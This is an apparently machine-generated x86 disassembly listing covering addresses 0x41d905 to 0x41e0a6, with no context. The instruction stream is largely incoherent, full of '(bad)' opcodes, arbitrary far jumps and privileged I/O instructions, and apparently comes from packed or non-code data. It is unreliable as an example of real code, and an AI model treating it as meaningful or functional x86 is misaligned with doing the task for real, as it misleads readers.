  41d905:	ret    
  41d906:	xlat   BYTE PTR ds:[ebx]
  41d907:	xlat   BYTE PTR ds:[ebx]
  41d908:	and    DWORD PTR [edi],ebp
  41d90a:	bound  esp,QWORD PTR [esi]
  41d90c:	mov    al,0xb4
  41d90e:	test   al,0xd8
  41d910:	mov    esi,0x762b023e
  41d915:	sbb    ch,BYTE PTR [edx-0x4cb7acf7]
  41d91b:	dec    ebx
  41d91c:	imul   edx,ebp,0x15f48a3d
  41d922:	cmp    cl,BYTE PTR [edi]
  41d924:	jbe    0x41d8f8
  41d926:	aad    0x7d
  41d928:	inc    esi
  41d929:	and    eax,0xb40765e0
  41d92e:	bound  esi,QWORD PTR [ebx-0x6afcc58f]
  41d934:	ror    DWORD PTR [ebx+ebx*8],cl
  41d937:	sbb    al,0xd9
  41d939:	pop    ebx
  41d93a:	xor    eax,ecx
  41d93c:	or     eax,0xb45053bc
  41d941:	inc    ecx
  41d942:	mov    dh,0x22
  41d944:	xor    eax,0xeb453e18
  41d949:	jmp    0xef55:0x7709c80b
  41d950:	(bad)  
  41d952:	xchg   ebp,eax
  41d953:	fs scas al,BYTE PTR es:[edi]
  41d955:	mov    edi,0x7e954b4c
  41d95b:	(bad)  
  41d95c:	lods   al,BYTE PTR ds:[esi]
  41d95d:	mov    ecx,0xc7ac24fb
  41d962:	sbb    eax,0xf86b2d29
  41d967:	push   0xffffffc3
  41d969:	jns    0x41d976
  41d96b:	daa    
  41d96c:	jge    0x41d979
  41d96e:	pop    edx
  41d96f:	fdivr  st(1),st
  41d971:	add    BYTE PTR [esp+edx*1+0x34e89f36],bl
  41d978:	add    esp,ecx
  41d97a:	mov    ecx,0xaa9a316b
  41d97f:	push   ecx
  41d980:	push   es
  41d981:	dec    ecx
  41d982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d983:	add    eax,0xae089e47
  41d988:	mov    ds:0xd6c60efe,al
  41d98d:	or     eax,0xc395263b
  41d992:	or     al,0x48
  41d994:	nop
  41d995:	vpmacssdqh ymm0,ymm6,ymm3,YMMWORD PTR [eax-0x41]
  41d99c:	sub    al,0xa9
  41d99e:	dec    ecx
  41d99f:	mov    al,ds:0x49f86e7c
  41d9a4:	data16 jle 0x41d9d2
  41d9a7:	cdq    
  41d9a8:	lods   al,BYTE PTR ds:[esi]
  41d9a9:	adc    ebp,ebx
  41d9ab:	fisub  WORD PTR [ecx]
  41d9ad:	inc    ecx
  41d9ae:	shr    DWORD PTR [ebx+ebp*2+0x4],cl
  41d9b2:	inc    ebx
  41d9b3:	fist   DWORD PTR [ecx+0x1d]
  41d9b6:	(bad)
  41d9ba:	jne    0x41da33
  41d9bc:	sub    ch,BYTE PTR [edi+ebx*4+0x61]
  41d9c0:	sbb    DWORD PTR [esi-0x28d80b2d],esp
  41d9c6:	in     al,dx
  41d9c7:	ficom  WORD PTR [edx]
  41d9c9:	add    dh,BYTE PTR [esi-0x77f9b3a6]
  41d9cf:	int    0xcc
  41d9d1:	pop    eax
  41d9d2:	pop    esi
  41d9d3:	sub    eax,0x4d3c35e1
  41d9d8:	jle    0x41da50
  41d9da:	enter  0xc26c,0x8d
  41d9de:	aam    0x85
  41d9e0:	push   ss
  41d9e1:	add    ch,bl
  41d9e3:	(bad)  
  41d9e4:	jo     0x41da55
  41d9e6:	test   DWORD PTR [edi-0x44ea573f],ebx
  41d9ec:	aam    0xd0
  41d9ee:	fisttp WORD PTR [ecx-0x62640324]
  41d9f4:	sub    DWORD PTR [ecx+0x71724f73],eax
  41d9fa:	lock adc al,0xac
  41d9fd:	sbb    DWORD PTR [ebx-0x42be6762],edx
  41da03:	test   eax,0x12399cb4
  41da08:	loop   0x41d9b8
  41da0a:	xor    eax,0x7b9e0f24
  41da0f:	icebp  
  41da10:	mov    dh,BYTE PTR [esi]
  41da12:	ja     0x41da80
  41da14:	mov    DWORD PTR [eax],eax
  41da16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da17:	add    esi,DWORD PTR ds:0x5974232c
  41da1d:	das    
  41da1e:	xchg   edi,eax
  41da1f:	popa   
  41da20:	jp     0x41da04
  41da22:	out    dx,eax
  41da23:	stos   DWORD PTR es:[edi],eax
  41da24:	(bad)  
  41da26:	sub    eax,0xe8459841
  41da2b:	pop    edi
  41da2c:	inc    si
  41da2e:	adc    cl,cl
  41da30:	retf   
  41da31:	mov    ebx,0x635b4337
  41da36:	nop
  41da37:	daa    
  41da38:	mov    BYTE PTR [edx+edi*1],bh
  41da3b:	or     DWORD PTR [ecx-0x76],0x15fdc1ed
  41da42:	mov    ebp,0x98378449
  41da47:	imul   ebp,ecx,0x1b
  41da4a:	add    esi,DWORD PTR [edx+0x75]
  41da4d:	shl    BYTE PTR [ebx],0xd4
  41da50:	cmp    BYTE PTR [ebx-0x1],0xb5
  41da54:	add    edx,edi
  41da56:	iret   
  41da57:	stos   BYTE PTR es:[edi],al
  41da58:	xor    edx,edx
  41da5a:	test   al,0x83
  41da5c:	mov    dh,0x1
  41da5e:	sbb    esi,ebx
  41da60:	mov    cl,0xbd
  41da62:	cmp    al,0x45
  41da64:	addr16 retf 
  41da66:	scas   al,BYTE PTR es:[edi]
  41da67:	rcr    BYTE PTR [ebx],0x68
  41da6a:	jl     0x41da5f
  41da6c:	jge    0x41dab3
  41da6e:	loope  0x41da5d
  41da70:	mov    dl,0xda
  41da72:	xchg   ebp,eax
  41da73:	cmp    eax,0xd153de88
  41da78:	sub    ecx,DWORD PTR [ecx+0x25322c33]
  41da7e:	add    BYTE PTR [edx-0x41],dh
  41da81:	or     BYTE PTR [edx],cl
  41da83:	xor    ah,BYTE PTR [edi-0x6b21b1c6]
  41da89:	mov    edi,0x86f33ae1
  41da8e:	repnz and eax,0x5243be0c
  41da94:	popf   
  41da95:	test   esi,esp
  41da97:	hlt    
  41da98:	add    eax,0x58b43adb
  41da9d:	std    
  41da9e:	lods   eax,DWORD PTR ds:[esi]
  41da9f:	retf   
  41daa0:	fsub   st,st(1)
  41daa2:	test   al,0xed
  41daa4:	hlt    
  41daa5:	jp     0x41dad1
  41daa7:	out    0xe8,eax
  41daa9:	retf   0x9c25
  41daac:	cmp    eax,0xd79b5ae8
  41dab1:	iret   
  41dab2:	ds pushf 
  41dab4:	xor    eax,0xaa23266f
  41dab9:	aaa    
  41daba:	int    0x33
  41dabc:	rol    DWORD PTR [ebp-0x13a718fe],cl
  41dac2:	lods   al,BYTE PTR ds:[esi]
  41dac3:	loopne 0x41db01
  41dac5:	scas   al,BYTE PTR es:[edi]
  41dac6:	xor    edx,esi
  41dac8:	int3   
  41dac9:	popa   
  41daca:	lea    eax,[esi+0xe]
  41dacd:	fidiv  WORD PTR [esi]
  41dacf:	(bad)  
  41dad0:	scas   al,BYTE PTR es:[edi]
  41dad1:	sbb    bx,WORD PTR [ebx+0x49]
  41dad5:	ins    BYTE PTR es:[edi],dx
  41dad6:	add    bl,dh
  41dad8:	lahf   
  41dad9:	fs ds dec ebp
  41dadc:	sub    ah,0xf
  41dadf:	adc    BYTE PTR [eax-0x2a],bl
  41dae2:	call   0xa20d:0x2947839b
  41dae9:	lock das 
  41daeb:	(bad)  
  41daed:	or     bl,bl
  41daef:	xchg   edi,eax
  41daf0:	add    eax,0xf4ab154d
  41daf5:	cmp    ch,BYTE PTR [ebp+0x12e53ea6]
  41dafb:	popf   
  41dafc:	fst    st(2)
  41dafe:	rcr    DWORD PTR [edx-0x5],1
  41db01:	das    
  41db02:	cs pop esp
  41db04:	pop    ecx
  41db05:	push   ecx
  41db06:	cmp    al,BYTE PTR [ebx+esi*1-0x20]
  41db0a:	pop    ebp
  41db0b:	cmp    al,0xc9
  41db0d:	ror    BYTE PTR [ebx],1
  41db0f:	fisttp DWORD PTR [eax]
  41db11:	ror    DWORD PTR [esi],1
  41db13:	sub    DWORD PTR [edx+ebp*1+0xaaba7ce],edx
  41db1a:	gs jmp 0x41db49
  41db1d:	test   BYTE PTR ds:0xcca5b35a,ch
  41db23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db24:	(bad)  
  41db25:	jmp    0x41db90
  41db27:	pop    ebp
  41db28:	mov    ah,0x17
  41db2a:	mov    BYTE PTR [eax],al
  41db2c:	or     ch,BYTE PTR [esi+0x2b]
  41db2f:	imul   edi,esp,0x387c68d4
  41db35:	inc    eax
  41db36:	dec    ecx
  41db37:	add    cl,BYTE PTR [ecx-0x1]
  41db3a:	(bad)  
  41db3b:	sti    
  41db3c:	mov    dh,0xeb
  41db3e:	nop
  41db3f:	daa    
  41db40:	and    ecx,DWORD PTR [esi+0x30]
  41db43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db44:	rcl    ebx,cl
  41db46:	mov    edx,DWORD PTR [ecx+edx*8]
  41db49:	xchg   edx,eax
  41db4a:	jl     0x41db20
  41db4c:	aas    
  41db4d:	sbb    cl,BYTE PTR [eax-0x41]
  41db50:	imul   eax,DWORD PTR [eax-0x5240de36],0x3a
  41db57:	lds    ebx,FWORD PTR [edx]
  41db59:	int3   
  41db5a:	arpl   WORD PTR [edi],bp
  41db5c:	and    eax,0x88c65873
  41db61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db62:	push   eax
  41db63:	jne    0x41db18
  41db65:	je     0x41dbdd
  41db67:	or     eax,eax
  41db69:	cli    
  41db6a:	jg     0x41db79
  41db6c:	cli    
  41db6d:	dec    esp
  41db6e:	jle    0x41db22
  41db70:	adc    ebp,DWORD PTR cs:[ebp+edi*2-0x2ed786a8]
  41db78:	loopne 0x41db86
  41db7a:	sti    
  41db7b:	sbb    eax,0xb95977ef
  41db80:	bound  ebx,QWORD PTR [esi-0x1a]
  41db83:	cdq    
  41db84:	mov    ebp,0x8358774c
  41db89:	xchg   ecx,eax
  41db8a:	data16 and ch,BYTE PTR [esi]
  41db8d:	xchg   edi,eax
  41db8e:	sub    bh,ch
  41db90:	adc    dh,bh
  41db92:	sar    DWORD PTR [ebx+0x2c],cl
  41db95:	adc    ecx,DWORD PTR [eax+0x4e6d4893]
  41db9b:	lds    ebp,FWORD PTR [eax+eax*1]
  41db9e:	mov    DWORD PTR [edi],esp
  41dba0:	in     eax,0x91
  41dba2:	sub    BYTE PTR [eax+0x390a2b3d],0xeb
  41dba9:	add    BYTE PTR [ecx],dh
  41dbab:	cmc    
  41dbac:	cmp    al,0xb1
  41dbae:	mov    ax,ds:0xa2be29e
  41dbb4:	mov    ss,WORD PTR [eax+ecx*2-0x36]
  41dbb8:	in     al,0x0
  41dbba:	push   edx
  41dbbb:	ret    0xd14a
  41dbbe:	popf   
  41dbbf:	inc    edx
  41dbc0:	mov    eax,0x7ddc7017
  41dbc5:	es loop 0x41dc18
  41dbc8:	popf   
  41dbc9:	and    al,0x3e
  41dbcb:	and    ch,ch
  41dbcd:	add    al,0x52
  41dbcf:	xor    al,0x5
  41dbd1:	leave  
  41dbd2:	xor    ebp,DWORD PTR [ecx]
  41dbd4:	sub    esp,DWORD PTR ds:0xb357b4a9
  41dbda:	sbb    ah,BYTE PTR [esi-0x7b]
  41dbdd:	adc    DWORD PTR [ebp+0x1747787b],ebp
  41dbe3:	outs   dx,BYTE PTR ds:[si]
  41dbe5:	int    0xcb
  41dbe7:	fistp  WORD PTR [ecx+0x72]
  41dbea:	sub    esi,0xffffffaa
  41dbed:	push   ds
  41dbee:	data16 in al,dx
  41dbf0:	popa   
  41dbf1:	inc    ebp
  41dbf2:	sbb    eax,DWORD PTR [esi+0x85e8ed5]
  41dbf8:	mov    DWORD PTR [edi+0x23c43540],ecx
  41dbfe:	push   0x71
  41dc00:	stos   BYTE PTR es:[edi],al
  41dc01:	imul   esi,DWORD PTR [eax-0x4d],0x3d
  41dc05:	shr    BYTE PTR [edi],1
  41dc07:	mov    ebx,0xcff589c0
  41dc0c:	(bad)  
  41dc0d:	scas   al,BYTE PTR es:[edi]
  41dc0e:	loopne 0x41dc1b
  41dc10:	jp     0x41dbd5
  41dc12:	push   0xe0e837eb
  41dc17:	rcl    cl,0xa9
  41dc1a:	aas    
  41dc1b:	repnz (bad) 
  41dc1d:	aas    
  41dc1e:	gs add ebx,edi
  41dc21:	out    0xb2,eax
  41dc23:	cmp    BYTE PTR [ebx+0x47f6e462],0xc8
  41dc2a:	ldmxcsr DWORD PTR [edi+0x29]
  41dc2e:	or     eax,0xe1e2f6f1
  41dc33:	push   eax
  41dc34:	test   eax,0x5d299cd4
  41dc3a:	in     eax,dx
  41dc3b:	clc    
  41dc3c:	in     eax,dx
  41dc3d:	adc    esi,DWORD PTR [ecx]
  41dc3f:	dec    esp
  41dc40:	mov    al,0x72
  41dc42:	int3   
  41dc43:	scas   eax,DWORD PTR es:[edi]
  41dc44:	add    al,0xeb
  41dc46:	jae    0x41dbfb
  41dc48:	inc    edi
  41dc49:	cdq    
  41dc4a:	pop    edi
  41dc4b:	fsubr  st,st(4)
  41dc4d:	pop    esp
  41dc4e:	lahf   
  41dc4f:	mov    esi,cs
  41dc51:	mov    dl,bh
  41dc53:	push   ss
  41dc54:	cld    
  41dc55:	jae    0x41dc82
  41dc57:	pop    ss
  41dc58:	test   eax,esi
  41dc5a:	(bad)  
  41dc5b:	push   esp
  41dc5c:	pusha  
  41dc5d:	(bad)  
  41dc5e:	lahf   
  41dc5f:	xchg   esi,eax
  41dc60:	in     eax,0x6a
  41dc62:	mov    ch,ch
  41dc64:	call   0xa6d5:0xf90e0cdb
  41dc6b:	imul   ebx,DWORD PTR [ecx],0x3e
  41dc6e:	or     edi,ecx
  41dc70:	mov    eax,DWORD PTR [ecx+0x2384603f]
  41dc76:	xchg   ebp,eax
  41dc77:	in     eax,dx
  41dc78:	ret    0x61eb
  41dc7b:	xlat   BYTE PTR ds:[ebx]
  41dc7c:	jmp    0x95141c2c
  41dc81:	jmp    0x5b13:0x589eea94
  41dc88:	and    al,0xfe
  41dc8a:	rol    BYTE PTR [edx+edx*1-0x23],cl
  41dc8e:	mov    gs,WORD PTR [ecx+0x11]
  41dc91:	xchg   edx,eax
  41dc92:	inc    eax
  41dc93:	and    DWORD PTR [esi-0x1c7c7691],esi
  41dc99:	jmp    0x41dc94
  41dc9b:	in     eax,dx
  41dc9c:	hlt    
  41dc9d:	push   eax
  41dc9e:	adc    DWORD PTR [ebp-0x70],ecx
  41dca1:	and    al,0xb0
  41dca3:	push   DWORD PTR [edx]
  41dca5:	mov    edx,0xaa9f9bb4
  41dcaa:	jne    0x41dd08
  41dcac:	mov    ecx,0x9e6f9e15
  41dcb1:	or     dl,ch
  41dcb3:	or     BYTE PTR [ebp-0x11273da0],ch
  41dcb9:	dec    eax
  41dcba:	adc    eax,0xedb85119
  41dcbf:	retf   0x2330
  41dcc2:	push   0xbfea7051
  41dcc7:	sti    
  41dcc8:	dec    ebp
  41dcc9:	pusha  
  41dcca:	mov    edi,0x2a31397d
  41dccf:	xchg   ecx,eax
  41dcd0:	cmp    ecx,DWORD PTR [eax]
  41dcd2:	jne    0x41dcfa
  41dcd4:	mov    eax,ds:0x26b226a5
  41dcd9:	sbb    al,0xc1
  41dcdb:	pop    eax
  41dcdc:	sub    dl,BYTE PTR [esi-0x30]
  41dcdf:	stos   BYTE PTR es:[edi],al
  41dce0:	aad    0x7f
  41dce2:	xor    edi,DWORD PTR [edi-0x16]
  41dce5:	add    cl,BYTE PTR [ecx+0x6e1fa870]
  41dceb:	jmp    0x41dd12
  41dced:	inc    ebx
  41dcee:	rcl    ah,cl
  41dcf0:	push   eax
  41dcf1:	pushw  ds
  41dcf3:	lock adc ecx,esi
  41dcf6:	sti    
  41dcf7:	out    0xaf,eax
  41dcf9:	mov    eax,ds:0x13ce78fd
  41dcfe:	call   0x10d8:0x5a40178b
  41dd05:	mov    DWORD PTR [edx-0x3c30ed97],eax
  41dd0b:	inc    ecx
  41dd0c:	jmp    DWORD PTR [eax]
  41dd0e:	xchg   ebp,eax
  41dd0f:	out    dx,eax
  41dd10:	sub    DWORD PTR [ebx+0x206ea5d9],0x25
  41dd17:	add    ch,ch
  41dd19:	mov    eax,0xcb41e4de
  41dd1e:	jcxz   0x41dcb6
  41dd21:	pop    ebp
  41dd22:	or     al,0xaa
  41dd24:	int3   
  41dd25:	sub    esi,esi
  41dd27:	cli    
  41dd28:	ds jb  0x41dd30
  41dd2b:	sub    eax,0xf07f310
  41dd30:	rcl    BYTE PTR [ebx+0x4ae675ff],0x22
  41dd37:	push   DWORD PTR [esi+edi*4-0x55]
  41dd3b:	jnp    0x41dd9f
  41dd3d:	lods   eax,DWORD PTR ds:[esi]
  41dd3e:	sub    DWORD PTR [edi+0x20925c3d],edi
  41dd44:	shr    DWORD PTR [esi*8+0x5461488c],0x82
  41dd4c:	push   eax
  41dd4d:	(bad)  
  41dd4e:	dec    esi
  41dd4f:	sbb    ax,0xdf83
  41dd53:	pop    eax
  41dd54:	out    dx,eax
  41dd55:	mov    eax,ds:0xe0447ff7
  41dd5a:	test   DWORD PTR [ebx-0x6f1745b2],esi
  41dd60:	call   0x98fe:0x7eeec2c6
  41dd67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd68:	pop    ebp
  41dd69:	(bad)  
  41dd6a:	push   cs
  41dd6b:	fldlg2 
  41dd6d:	xlat   BYTE PTR ds:[ebx]
  41dd6e:	stos   BYTE PTR es:[edi],al
  41dd6f:	mov    ds:0xf0957de5,eax
  41dd74:	ror    BYTE PTR [eax],1
  41dd76:	cs es in al,0x4c
  41dd7a:	push   es
  41dd7b:	mov    bl,BYTE PTR [ecx]
  41dd7d:	sbb    ebp,esi
  41dd7f:	or     eax,0x6dedc393
  41dd84:	push   es
  41dd85:	sbb    BYTE PTR [ecx-0x2223e7d3],0x2d
  41dd8c:	jns    0x41dd89
  41dd8e:	add    dl,BYTE PTR [esi]
  41dd90:	ins    BYTE PTR es:[edi],dx
  41dd91:	mov    ecx,DWORD PTR [ecx+eax*4+0x7aaf401a]
  41dd98:	mov    ecx,0x210f73b
  41dd9d:	mov    ch,0x28
  41dd9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dda0:	push   esp
  41dda1:	mov    BYTE PTR [ebp*2-0x2a940859],ah
  41dda8:	and    eax,0x7500d86f
  41ddad:	test   DWORD PTR [esi+esi*1+0x273ccf47],esi
  41ddb4:	jb     0x41ddda
  41ddb6:	mov    eax,ds:0x4a8bc01f
  41ddbb:	pop    eax
  41ddbc:	inc    ecx
  41ddbd:	ror    ah,0xaa
  41ddc0:	std    
  41ddc1:	jb     0x41de08
  41ddc3:	call   0xfa10:0x8d1ca4a4
  41ddca:	aad    0xd9
  41ddcc:	push   ds
  41ddcd:	inc    ebx
  41ddce:	xor    ch,BYTE PTR [ebp+0x75]
  41ddd1:	push   ebx
  41ddd2:	pusha  
  41ddd3:	xor    DWORD PTR [edi+ebx*2-0x32de3c29],ecx
  41ddda:	call   0x48d2:0x31544546
  41dde1:	and    eax,DWORD PTR [ebx]
  41dde3:	xor    eax,0xbee2ebd2
  41dde8:	in     eax,dx
  41dde9:	pmulhuw mm7,QWORD PTR [eax-0xa23c6f9]
  41ddf0:	xchg   BYTE PTR ds:0xfbf69547,dh
  41ddf6:	adc    BYTE PTR [esi-0x17],0xd5
  41ddfa:	ins    BYTE PTR es:[edi],dx
  41ddfb:	xor    ecx,esi
  41ddfd:	lods   al,BYTE PTR ds:[esi]
  41ddfe:	outs   dx,DWORD PTR ds:[esi]
  41ddff:	add    edx,DWORD PTR [ebx-0x39f3b17b]
  41de05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de06:	ins    DWORD PTR es:[edi],dx
  41de07:	pop    ebx
  41de08:	adc    BYTE PTR [ebp-0x276df7b6],bl
  41de0e:	loope  0x41de36
  41de10:	arpl   WORD PTR [esi+0x5],bx
  41de13:	pop    ecx
  41de14:	ror    BYTE PTR [edi+0x66f906de],cl
  41de1a:	jmp    0xc2ba3c39
  41de1f:	dec    esi
  41de20:	mov    al,0x34
  41de22:	or     bh,bh
  41de24:	xchg   BYTE PTR [edi],bl
  41de26:	sub    BYTE PTR [ecx+edi*2],ah
  41de29:	test   DWORD PTR [ecx],esi
  41de2b:	mov    eax,ss
  41de2d:	and    dl,BYTE PTR [ebx-0x140c88d8]
  41de33:	into   
  41de34:	push   edx
  41de35:	adc    eax,0x32ee74a9
  41de3a:	add    eax,0xe9347661
  41de3f:	mov    dh,0x9c
  41de41:	mov    cl,0xb0
  41de43:	(bad)  
  41de45:	lds    esi,FWORD PTR [esi+0x75c10d9]
  41de4b:	mov    edx,?
  41de4d:	add    al,0x75
  41de4f:	mov    ebx,edx
  41de51:	add    al,0xe0
  41de53:	loop   0x41de8a
  41de55:	mov    ds:0x267c6b68,eax
  41de5a:	inc    esp
  41de5b:	sar    edi,0xa5
  41de5e:	daa    
  41de5f:	aas    
  41de60:	and    eax,0x71f48cb0
  41de65:	into   
  41de66:	pop    ecx
  41de67:	cmp    DWORD PTR [eax],edi
  41de69:	int3   
  41de6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de6b:	pop    ebx
  41de6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de6d:	sbb    BYTE PTR [edx+0x10],dl
  41de70:	pop    es
  41de71:	outs   dx,DWORD PTR ds:[esi]
  41de72:	add    cl,al
  41de74:	pop    edx
  41de75:	sahf   
  41de76:	call   0xe465:0xa773d9fa
  41de7d:	loope  0x41de23
  41de7f:	repz sbb eax,0x78ee190f
  41de85:	es das 
  41de87:	mov    ds:0x2ba9f9d7,eax
  41de8c:	retf   0xfdde
  41de8f:	add    DWORD PTR [edx+eiz*2],eax
  41de92:	das    
  41de93:	sub    DWORD PTR ds:0xe9384507,0xf7c7ad6b
  41de9d:	mov    eax,ds:0x970fd5ce
  41dea2:	or     DWORD PTR [ebp-0x14],ecx
  41dea5:	push   ebp
  41dea6:	jmp    0x2001:0xb8472e06
  41dead:	fsubr  st,st(1)
  41deaf:	(bad)  
  41deb0:	scas   al,BYTE PTR es:[edi]
  41deb1:	aaa    
  41deb2:	call   0xd647:0x8ff26180
  41deb9:	dec    ebx
  41deba:	adc    ebx,DWORD PTR [eax+0x19]
  41debd:	sahf   
  41debe:	mov    ds:0x585b467c,al
  41dec3:	out    0x46,eax
  41dec5:	add    DWORD PTR [eax-0x1057920a],eax
  41decb:	in     eax,0x61
  41decd:	mov    ecx,0x9055b94e
  41ded2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ded3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ded4:	lods   al,BYTE PTR ds:[esi]
  41ded5:	fst    QWORD PTR [ebx-0x12]
  41ded8:	inc    ebp
  41ded9:	ins    DWORD PTR es:[edi],dx
  41deda:	adc    eax,0xe1739463
  41dedf:	scas   al,BYTE PTR es:[edi]
  41dee0:	and    edx,esi
  41dee2:	or     ch,BYTE PTR [ecx]
  41dee4:	js     0x41deeb
  41dee6:	retf   
  41dee7:	jmp    0xcc7a:0xf0d4e587
  41deee:	std    
  41deef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def0:	es ja  0x41de9e
  41def3:	inc    esp
  41def4:	mov    bh,0x2
  41def6:	sbb    eax,0xaf90b4a8
  41defb:	adc    eax,DWORD PTR [edi+0x641d6156]
  41df01:	bound  ebp,QWORD PTR [edi-0x61]
  41df04:	test   DWORD PTR [edx-0x74],ebp
  41df07:	push   edi
  41df08:	push   esi
  41df09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df0a:	rcl    DWORD PTR [ecx-0x39],1
  41df0d:	jne    0x41de91
  41df0f:	aas    
  41df10:	jmp    0x9841f487
  41df15:	jno    0x41df19
  41df17:	dec    esp
  41df18:	xchg   esi,eax
  41df19:	std    
  41df1a:	adc    al,BYTE PTR [ecx]
  41df1c:	dec    esp
  41df1d:	fcmovnu st,st(2)
  41df1f:	in     al,dx
  41df20:	sub    al,0xad
  41df22:	xor    BYTE PTR [edx+edi*1-0x7e],ah
  41df26:	test   al,0x8d
  41df28:	inc    edx
  41df29:	loop   0x41df0d
  41df2b:	mov    dh,0xd4
  41df2d:	adc    eax,DWORD PTR [ecx]
  41df2f:	shl    DWORD PTR [ebp-0x4cb467fa],cl
  41df35:	aam    0x63
  41df37:	(bad)  
  41df38:	cdq    
  41df39:	mov    eax,ds:0x4c55fbb6
  41df3e:	jmp    0xeb81:0x9b6be3ca
  41df45:	cmp    esp,DWORD PTR [ebx-0x7985a341]
  41df4b:	sbb    edi,eax
  41df4d:	add    BYTE PTR ds:[ebp-0x64],0x2e
  41df52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df53:	sti    
  41df54:	and    eax,0xe6f0e555
  41df59:	push   edx
  41df5a:	and    BYTE PTR [ebx+esi*4+0x40],bl
  41df5e:	push   es
  41df5f:	pop    edx
  41df60:	dec    edi
  41df61:	sub    al,0x5d
  41df63:	imul   esi,DWORD PTR [ebx-0x13],0xee96f91d
  41df6a:	in     eax,0x29
  41df6c:	es cld 
  41df6e:	ds or  al,0xda
  41df71:	(bad)  
  41df72:	cmp    eax,0xa53fb32c
  41df77:	(bad)  
  41df79:	or     BYTE PTR [eax+0x3531807f],0x0
  41df80:	and    dh,cl
  41df82:	retf   0x38f4
  41df85:	fisttp QWORD PTR [ecx-0x31]
  41df88:	xchg   dh,bh
  41df8a:	or     cl,al
  41df8c:	push   esi
  41df8d:	xor    al,0x71
  41df8f:	mov    esi,0x3fbcb5cd
  41df94:	xchg   dl,bl
  41df96:	mov    ebx,0x53645837
  41df9b:	add    al,0xb1
  41df9d:	mov    ebp,0xe7d3c08
  41dfa2:	aad    0x84
  41dfa4:	cld    
  41dfa5:	retf   0xbfba
  41dfa8:	add    dl,BYTE PTR [edx]
  41dfaa:	mov    eax,ds:0x2950efcb
  41dfaf:	ins    BYTE PTR es:[edi],dx
  41dfb0:	and    BYTE PTR [ebx-0x4ab99071],bh
  41dfb6:	push   edx
  41dfb8:	dec    ebx
  41dfb9:	jmp    0xb1732de6
  41dfbe:	ins    BYTE PTR es:[edi],dx
  41dfbf:	ret    0x16f7
  41dfc2:	imul   ecx,ebx,0xffffffd7
  41dfc5:	jae    0x41e030
  41dfc7:	push   0xe2201ccd
  41dfcc:	lds    ebx,FWORD PTR [ebp-0x17b014e4]
  41dfd2:	dec    ebp
  41dfd3:	sbb    eax,0xe2cc9e56
  41dfd8:	or     DWORD PTR [ebp+0x35f919d9],edx
  41dfde:	neg    BYTE PTR [ebp+ecx*4-0x4]
  41dfe2:	and    DWORD PTR [esi+eiz*8-0x7745415a],eax
  41dfe9:	mov    ebx,0x8ef14016
  41dfee:	jbe    0x41e060
  41dff0:	jae    0x41dfe9
  41dff2:	aaa    
  41dff3:	mov    cl,BYTE PTR [esi]
  41dff5:	xor    al,0x94
  41dff7:	dec    ebp
  41dff8:	pop    esi
  41dff9:	cwde   
  41dffa:	inc    edx
  41dffb:	std    
  41dffc:	mov    edx,0x87798549
  41e001:	mov    dh,0xce
  41e003:	or     bl,BYTE PTR [ecx+esi*4]
  41e006:	or     eax,0x4943bf22
  41e00b:	pop    ebp
  41e00c:	cmp    BYTE PTR [eax+0x3bd1734e],ch
  41e012:	xor    DWORD PTR [esi],ebx
  41e014:	pop    ss
  41e015:	xchg   esp,eax
  41e016:	push   ss
  41e017:	add    eax,0x7b039f58
  41e01c:	pusha  
  41e01d:	push   esp
  41e01e:	cmp    DWORD PTR [esi-0x21],esi
  41e021:	les    ecx,FWORD PTR [esi]
  41e023:	dec    esi
  41e024:	dec    edx
  41e025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e026:	mov    bh,0xde
  41e028:	repnz adc eax,0xbf1b75b5
  41e02e:	or     eax,0x1fa25d5
  41e033:	out    dx,eax
  41e034:	loope  0x41dffe
  41e036:	outs   dx,DWORD PTR ds:[esi]
  41e037:	clc    
  41e038:	and    al,0x26
  41e03a:	out    dx,al
  41e03b:	ret    0xb8d5
  41e03e:	aas    
  41e03f:	(bad)
  41e042:	cmp    al,0x4c
  41e044:	repnz in eax,0x4d
  41e047:	cmp    cl,BYTE PTR [edx+0x67]
  41e04a:	xchg   BYTE PTR [esi],ch
  41e04c:	add    eax,0x5f0efedb
  41e051:	mov    dh,0x35
  41e053:	sub    DWORD PTR [edx+esi*4-0x3aeee9ba],0x9d3ffb43
  41e05e:	dec    ebp
  41e05f:	test   BYTE PTR [ebp+0x677bdee9],bl
  41e065:	push   edi
  41e066:	cmp    bl,dh
  41e068:	cmp    dh,dl
  41e06a:	scas   al,BYTE PTR es:[edi]
  41e06b:	loop   0x41dff8
  41e06d:	push   es
  41e06e:	xor    al,0xb1
  41e070:	loope  0x41e0eb
  41e072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e073:	pop    es
  41e074:	imul   esi,DWORD PTR [esi-0x25b370b3],0x2ac1c763
  41e07e:	lods   eax,DWORD PTR ds:[esi]
  41e07f:	repz inc esi
  41e081:	mov    DWORD PTR [edi],ebp
  41e083:	or     eax,0xcefe8ed4
  41e088:	push   edi
  41e089:	fs and al,0x11
  41e08c:	out    0x67,al
  41e08e:	cmp    ebp,esp
  41e090:	fidiv  WORD PTR [edx+ebx*2+0x4d]
  41e094:	sbb    ebp,ebx
  41e096:	out    0x41,al
  41e098:	pusha  
  41e099:	pop    edx
  41e09a:	stos   BYTE PTR es:[edi],al
  41e09b:	pop    eax
  41e09c:	cmp    bh,dl
  41e09e:	jne    0x41e06f
  41e0a0:	dec    eax
  41e0a1:	jg     0x41e0cb
  41e0a3:	xchg   ecx,eax
  41e0a4:	fmul   st(6),st
  41e0a6:	scas   al,BYTE PTR es:[edi]
